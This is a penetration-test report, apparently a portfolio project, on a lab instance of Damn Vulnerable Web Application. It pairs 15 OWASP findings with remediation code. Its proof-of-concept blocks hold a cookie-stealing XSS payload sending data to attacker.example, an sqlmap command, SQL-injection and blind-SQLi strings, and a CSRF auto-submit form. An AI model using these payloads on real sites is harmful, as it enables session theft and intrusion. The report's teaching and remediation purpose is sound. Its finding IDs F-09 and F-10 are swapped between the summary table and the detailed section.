
# Web Application Penetration Test — DVWA (Damn Vulnerable Web Application)

**Project type:** Hands-on web application penetration test (educational / portfolio)  
**Skills:** Web Application Security, OWASP Top 10, Penetration Testing, Vulnerability Assessment, Risk Scoring (CVSS v3.1), Remediation Guidance  
**Tools:** Burp Suite Pro, SQLMap, OWASP ZAP, Nikto, curl, nmap, browser DevTools, sqlmap, proxychains

---

## Executive Summary

This engagement is a comprehensive security assessment of a lab-deployed instance of **Damn Vulnerable Web Application (DVWA)**. The test focused on common web application vulnerabilities mapped to the OWASP Top 10 and included automated scanning and manual verification.

**Top-line results**
- **Total confirmed findings:** 15 (critical → low)
- **Highest-impact issues:** SQL Injection, Broken Authentication, Weak Password Storage, Stored XSS
- **Deliverables:** This report (MD), PoC snippets (lab-safe), Burp/ZAP exports, screenshots, remediation guidance, CVSS v3.1 vectors for each finding.

> **Scope & Authorization:** All testing performed on a local/lab DVWA instance with explicit authorization for educational/portfolio use. No external systems were targeted.

---

## Table of Contents

1. [Scope & Rules of Engagement](#scope--rules-of-engagement)  
2. [Methodology](#methodology)  
3. [Environment & Setup](#environment--setup)  
4. [Findings Summary (15 findings)](#findings-summary-15-findings)  
5. [Detailed Findings (PoC & Remediation)](#detailed-findings-poc--remediation)  
6. [Remediation Roadmap & Prioritization](#remediation-roadmap--prioritization)  
7. [Re-test & Validation Steps](#re-test--validation-steps)  
8. [Artifacts & Appendix](#artifacts--appendix)  
9. [Lessons Learned & Next Steps](#lessons-learned--next-steps)  
10. [Legal & Ethics Reminder](#legal--ethics-reminder)

---

## Scope & Rules of Engagement

- **Target:** DVWA (local/lab instance)  
- **Test dates:** [insert dates]  
- **Authorization:** Instructor / Lab Owner (written/explicit)  
- **Exclusions:** No DoS or destructive tests. No testing outside the lab. No exfiltration of real user data.  
- **Deliverables:** This markdown report, PoC snippets, Burp/ZAP exports, screenshots, and remediation guidance.

---

## Methodology

1. **Reconnaissance:** Manual browsing + Burp Spider to enumerate pages, forms, parameters.  
2. **Automated scanning:** OWASP ZAP quick/full scans, Nikto for server misconfigs.  
3. **Targeted manual testing:** Injection (SQL/OS), XSS (reflected/stored/DOM), auth logic, session management, IDOR, CSRF, file upload, insecure storage.  
4. **Exploitation (PoC only):** Controlled PoCs that do not damage the environment.  
5. **Risk scoring:** CVSS v3.1 base scores used to prioritize remediation.

---

## Environment & Setup

- DVWA (latest lab build) on a local LAMP stack (PHP + MySQL).  
- Tools/Workstation: Burp Suite Pro (proxy, repeater, intruder), SQLMap, OWASP ZAP, Nikto, nmap, Chrome/Firefox DevTools.  
- Network: Localhost / lab network. No external hosts targeted.

---

## Findings Summary (15 findings)

| ID | OWASP Category | Short Title | CVSS v3.1 (Base) | Priority |
|---:|---|---|---:|---:|
| F-01 | A1: Injection | SQL Injection (login & search) | 9.8 | P0 |
| F-02 | A7: XSS | Stored Cross-Site Scripting (comments) | 7.4 | P0 |
| F-03 | A2: Broken Auth | Authentication bypass / weak session IDs | 8.8 | P0 |
| F-04 | A8: CSRF | Missing CSRF tokens on state-changing forms | 7.5 | P1 |
| F-05 | A5: Security Misconfiguration | Verbose error messages / stack traces | 6.5 | P1 |
| F-06 | A4: IDOR | Insecure Direct Object Reference on profile | 7.0 | P1 |
| F-07 | A3: Sensitive Data Exposure | Weak password hashing (MD5 / unsalted) | 9.0 | P0 |
| F-08 | A6: Vulnerable Components | Unpatched PHP modules / libraries | 6.1 | P2 |
| F-09 | A10: Unvalidated Redirects | Open redirect via `redirect` parameter | 5.0 | P3 |
| F-10 | A9: Insufficient Logging | Missing audit logging of auth events | 5.3 | P2 |
| F-11 | A1: Injection | Blind SQLi in search feature | 8.6 | P0 |
| F-12 | A7: XSS | Reflected XSS in search / query param | 6.1 | P1 |
| F-13 | A5: File Upload | Insecure file upload allowing .php upload | 8.2 | P1 |
| F-14 | A3: Sensitive Data Exposure | Sensitive config files accessible via webroot | 8.0 | P0 |
| F-15 | A6: Cryptographic Failures | Session cookies missing Secure/HttpOnly flags | 6.4 | P1 |

*(Full evidence, screenshots and raw scan exports available in `artifacts/` folder in the repo.)*

---

## Detailed Findings — PoC & Remediation

> **Note:** All PoCs are intentionally lab-safe and contain commands to run only against authorized lab instances.

---

### F-01 — SQL Injection (login parameter)
- **Endpoint:** `/login.php` (POST: `username`)  
- **Impact:** Full DB read / auth bypass / data exfiltration.  
- **CVSS v3.1:** 9.8 (Critical)  
- **Discovery:** Burp Intruder + manual injection showed `username = ' OR '1'='1` bypasses auth. SQLMap confirmed injection and database enumeration.

**PoC (example):**
```bash
# Authorized lab-only usage
sqlmap -u "http://dvwa.local/login.php" --data="username=admin&password=pass&Login=Login" -p username --batch
```

**Remediation:**
- Use parameterized queries / prepared statements (no string concatenation).  
- Apply input validation and least-privilege DB accounts.  
- Add WAF rules to block common SQLi patterns.

**Secure example (PHP PDO):**
```php
$stmt = $pdo->prepare('SELECT id, username, password_hash FROM users WHERE username = ?');
$stmt->execute([$username]);
```

---

### F-02 — Stored Cross-Site Scripting (comments / guestbook)
- **Endpoint:** `/comments.php` (comment body saved & displayed)  
- **Impact:** Persistent XSS — session hijack, CSRF chaining, malicious actions.  
- **CVSS v3.1:** 7.4 (High)

**PoC:** Submit:
```html
<script>fetch('http://attacker.example/collect?c='+document.cookie)</script>
```
Result: Run when other users view comments.

**Remediation:**
- Output-encode user-supplied content (contextual).  
- Use `htmlspecialchars` in PHP or a templating engine with auto-escaping.  
- Implement Content Security Policy (CSP) headers.

**Example:**
```php
echo htmlspecialchars($comment_text, ENT_QUOTES | ENT_HTML5, 'UTF-8');
```

---

### F-03 — Broken Authentication (predictable session tokens / auth bypass)
- **Endpoint:** Session cookie generation and login workflow  
- **Impact:** Session hijack, impersonation.  
- **CVSS v3.1:** 8.8 (High)

**Findings & Remediation:**
- Regenerate session ID on login (`session_regenerate_id(true)`).  
- Ensure session identifiers are cryptographically random (use framework defaults).  
- Set cookie flags: `HttpOnly`, `Secure`, `SameSite`.  
- Implement account lockout / rate-limiting for auth endpoints.

---

### F-04 — CSRF (missing anti-CSRF tokens)
- **Affected:** `change_password.php`, `reset.php`, `settings` forms  
- **Impact:** Attacker can cause state changes for authenticated users via forged requests.  
- **CVSS v3.1:** 7.5 (High)

**PoC (concept):**
```html
<form action="http://dvwa.local/change_password.php" method="POST">
  <input type="hidden" name="password_new" value="pwned123" />
  <input type="submit" value="Submit" />
</form>
<script>document.forms[0].submit();</script>
```

**Remediation:**
- Implement per-session CSRF tokens and validate on POST.  
- Verify `Origin` or `Referer` headers where appropriate.  
- Use `SameSite` cookie attribute.

**Example token flow (PHP):**
```php
// generate
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));
// verify
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'] ?? '')) { die('CSRF validation failed'); }
```

---

### F-05 — Verbose server error messages
- **Impact:** Leak of server internals, stack traces, file paths.  
- **CVSS v3.1:** 6.5 (Medium)

**Remediation:**
- Disable display of detailed errors in production (`display_errors = Off`).  
- Log stack traces securely (not to webroot) and present generic error pages to users.

---

### F-06 — IDOR on user profile endpoint
- **Endpoint:** `/profile.php?user_id=###`  
- **Impact:** Attacker can view or modify other users’ profiles by enumerating IDs.  
- **CVSS v3.1:** 7.0 (High)

**Remediation:**
- Enforce server-side authorization checks: a user must only access resources they are authorized to.  
- Use opaque references or UUIDs and check ownership on each request.

---

### F-07 — Weak password hashing (MD5 / unsalted)
- **Impact:** Hashes crackable offline, leading to credential compromise.  
- **CVSS v3.1:** 9.0 (Critical)

**Remediation:**
- Migrate to modern hashing (`bcrypt`, `argon2`).  
- Use `password_hash()` / `password_verify()` functions in PHP.  
- Enforce strong password policies and consider MFA for critical accounts.

**Example (PHP):**
```php
$hash = password_hash($password, PASSWORD_BCRYPT);
if (password_verify($password_input, $hash)) { /* ok */ }
```

---

### F-08 — Outdated / vulnerable components (PHP modules)
- **Tool:** Nikto & manual checks  
- **Impact:** Known vulnerabilities in older components could be exploited.  
- **CVSS v3.1:** 6.1 (Medium)

**Remediation:**
- Maintain an inventory and apply security patches regularly.  
- Use dependency scanners and SCA (software composition analysis) in CI.

---

### F-09 — Insufficient logging & monitoring
- **Impact:** Failed detection of suspicious activity, incident response gaps.  
- **CVSS v3.1:** 5.3 (Medium)

**Remediation:**
- Centralize logs, enable audit trails for login attempts, account changes, and admin actions.  
- Ensure logs are tamper-evident and stored off the web server.

---

### F-10 — Open redirect (unvalidated `redirect` param)
- **Impact:** Phishing / redirect to malicious sites.  
- **CVSS v3.1:** 5.0 (Low)

**Remediation:**
- Avoid accepting arbitrary redirect URLs. Validate against a whitelist or use relative paths only.

---

### F-11 — Blind SQL Injection (search field)
- **Impact:** Data exfiltration via blind techniques (time-based).  
- **CVSS v3.1:** 8.6 (High)

**PoC (time-based):**
```sql
' OR IF(1=1, SLEEP(5), 0) -- 
```

**Remediation:** Same as F-01: parameterized queries, input validation, least privilege.

---

### F-12 — Reflected XSS (search parameter)
- **Impact:** Immediate script execution for victim visiting crafted URL.  
- **CVSS v3.1:** 6.1 (Medium)

**Remediation:** Contextual output encoding and CSP.

---

### F-13 — Insecure file upload (allows PHP files)
- **Impact:** Remote code execution (RCE) if uploaded PHP executes.  
- **CVSS v3.1:** 8.2 (High)

**PoC (concept):** Upload `shell.php` to upload endpoint and access resulting URL.

**Remediation:**
- Validate file types by server-side MIME type & content inspection.  
- Store uploads outside webroot, disallow direct execution.  
- Rename files and apply restrictive permissions.

---

### F-14 — Sensitive config files exposed (e.g., `config.inc.php`)
- **Impact:** Credentials / DB strings exposed leading to full compromise.  
- **CVSS v3.1:** 8.0 (High)

**Remediation:**
- Move config files out of webroot or restrict webserver access with config rules.  
- Ensure least privilege on filesystem and rotate exposed credentials.

---

### F-15 — Session cookie flags missing (Secure/HttpOnly)
- **Impact:** Cookie theft via XSS or network eavesdropping (if not Secure).  
- **CVSS v3.1:** 6.4 (Medium)

**Remediation:**
- Set `Set-Cookie` flags: `HttpOnly; Secure; SameSite=Strict` (or Lax where needed).  
- Enforce HTTPS only (use HSTS).

---

## Remediation Roadmap & Prioritization

**Immediate (P0 — high urgency)**  
- F-01 SQLi, F-07 Weak hashing, F-03 Broken Auth, F-11 Blind SQLi, F-02 Stored XSS — Fix within days; perform regression test.

**Near term (P1 — 1–3 weeks)**  
- F-04 CSRF, F-06 IDOR, F-13 File upload, F-15 Cookie flags, F-12 Reflected XSS.

**Medium term (P2 — 1–3 months)**  
- F-05 Verbose errors, F-08 Vulnerable components, F-09 Logging, F-10 Open redirect.

**Long term (P3 — continuous)**  
- Secure SDLC improvements: SAST in CI, dependency scanning, threat modeling, developer training, MFA adoption.

---

## Re-test & Validation Steps

1. Patch each issue and produce a short remediation ticket referencing this report (include lines & PoC).  
2. Re-run automated scans (ZAP/Nikto).  
3. Perform focused manual tests for each fixed issue to ensure remediation was effective (e.g., attempt SQLi payloads again).  
4. Produce a closure report that includes updated CVSS scores and screenshots showing fixes.

---

## Artifacts & Appendix

- `artifacts/` (repository):  
  - `burp_report.xml` (Burp export)  
  - `zap_report.html` (ZAP export)  
  - `nikto_output.txt`  
  - `sqlmap_output/` (if used)  
  - `screenshots/` (PoC evidence: login-bypass, stored-xss, file-upload)  
  - `cvss_vectors.csv` (vectors for each finding)  
- Sample PoC snippets and remediation code are included above. Full PoCs are stored in `artifacts/pocs/` and are intended for lab re-testing only.

---

## How to reproduce (lab-safe instructions)

1. Deploy DVWA locally (follow DVWA README).  
2. Start Burp Suite and configure your browser to proxy through it.  
3. Browse to DVWA and run an authenticated Burp scan on the app.  
4. Use the provided PoC commands (only against your lab instance) to validate the issues.  
5. After fixes, re-run scans and manual tests to confirm remediation.

---

## Lessons Learned & Next Steps

- Many critical vulnerabilities are rooted in bad defaults (weak hashing, unsanitized inputs, missing CSRF). Fixing secure defaults (framework-level protections, secure config) reduces developer burden.  
- Prioritize eliminating remote code/data access (SQLi, file upload RCE) first — they provide the largest risk reduction.  
- Implement CI security gates (SAST, SCA) and developer secure-coding training.

**Suggested follow-ups**
- Re-test after remediation and provide closure evidence.  
- Integrate automated security testing into CI (SAST, dependency checks).  
- Run a short secure-coding session for devs covering prepared statements, output encoding, and secure storage.

---

## Legal & Ethics Reminder

All testing performed on an authorized DVWA lab instance. Never run these tests against systems you do not own or for which you do not have explicit written permission. Unauthorized testing is illegal and unethical.

---

## Contact & Credits

- **Lead tester / report author:** [Alison Rivera]  
- **Tools used:** Burp Suite Pro, SQLMap, OWASP ZAP, Nikto, nmap, browser DevTools  
- **Project repo:** https://github.com/alexrivera/webapp-pentest-dvwa  
- **References:** OWASP Top 10, CVSS v3.1 spec, official tool docs for Burp/ZAP/SQLMap/Nikto

---

*End of report — save as `DVWA-WebApp-Pentest-Report.md` and place artifacts in `artifacts/` alongside this file for portfolio completeness.*
